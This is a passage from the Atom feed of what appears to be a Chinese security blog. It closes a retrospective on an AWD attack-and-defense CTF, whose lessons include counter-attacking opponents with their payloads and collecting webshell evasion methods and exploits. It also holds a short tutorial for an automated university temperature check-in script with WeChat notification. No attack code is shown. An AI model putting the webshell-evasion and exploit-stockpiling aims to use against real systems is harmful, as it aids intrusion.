class="headerlink" title="提升payload熟练度"></a>提升payload熟练度</h2><p>要求平时复现过程中不能拿到直接打，要分析原理与利用链。</p><h2 id="提升运维水平"><a href="#提升运维水平" class="headerlink" title="提升运维水平"></a>提升运维水平</h2><p>赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。</p><p>控制好相关文件的读写权限等。</p><h2 id="提升应急反应能力"><a href="#提升应急反应能力" class="headerlink" title="提升应急反应能力"></a>提升应急反应能力</h2><p>要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。</p><h2 id="提升反制能力"><a href="#提升反制能力" class="headerlink" title="提升反制能力"></a>提升反制能力</h2><p>要能通过别人打的payload反打别人</p><h2 id="完善武器库"><a href="#完善武器库" class="headerlink" title="完善武器库"></a>完善武器库</h2><p>多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。&lt;/p&gt;
&lt;h1 id=&quot;开赛&quot;&gt;&lt;a href=&quot;#开赛&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>智慧曲园自动签到+微信推送</title>
    <link href="https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
    <id>https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</id>
    <published>2021-01-19T14:11:27.000Z</published>
    <updated>2021-01-19T12:21:05.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智慧曲园自动签到"><a href="#智慧曲园自动签到" class="headerlink" title="智慧曲园自动签到"></a>智慧曲园自动签到</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>使用方法：</p><p>首先安装环境依赖 pip3 install requests</p><p>将该脚本上传至服务器 （我的路径是/root）</p><p>新建脚本 auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>新建定时任务</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>每天凌晨0点1分自动执行 /root/auto.sh 这条命令</p><h1 id="绑定server酱"><a href="#绑定server酱" class="headerlink" title="绑定server酱"></a>绑定server酱</h1><p>在server酱绑定微信后，拿到key，放到下面脚本 <strong>yourkey</strong> 这个地方。</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;智慧曲园自动签到&quot;&gt;&lt;a href=&quot;#智慧曲园自动签到&quot; class=&quot;headerlink&quot; title=&quot;智慧曲园自动签到&quot;&gt;&lt;/a&gt;智慧曲园自动签到&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/polosec/qfnuAutoTe</summary>
      
    
    
    
    
  </entry>
  
</feed>
